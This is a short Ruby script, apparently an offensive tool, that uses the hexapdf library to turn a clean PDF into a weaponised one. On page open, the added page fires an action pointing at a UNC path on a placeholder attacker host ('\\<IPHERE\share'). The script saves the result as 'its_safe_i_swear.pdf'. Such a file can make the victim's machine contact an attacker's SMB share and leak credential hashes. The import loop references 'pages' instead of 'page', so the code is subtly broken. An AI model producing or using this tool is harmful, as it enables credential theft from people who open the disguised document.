#!/usr/bin/env ruby
#provide a clean pdf to get it dirty
###################
require 'hexapdf'

bad_pdf = HexaPDF::Document.new
good_pdf = HexaPDF::Document.open(ARGV[0])

good_pdf.pages.each {|page| bad_pdf.pages << bad_pdf.import(pages)}
bad_pdf.pages.add

bad_pdf.pages[1][:AA] = {
    O: {
        Type: :Action,
        F: "\\\\<IPHERE\\share",
        S: :GoToE,
        D: [bad_pdf.pages[0], :Fit],
    }
    }
bad_pdf.write("its_safe_i_swear.pdf")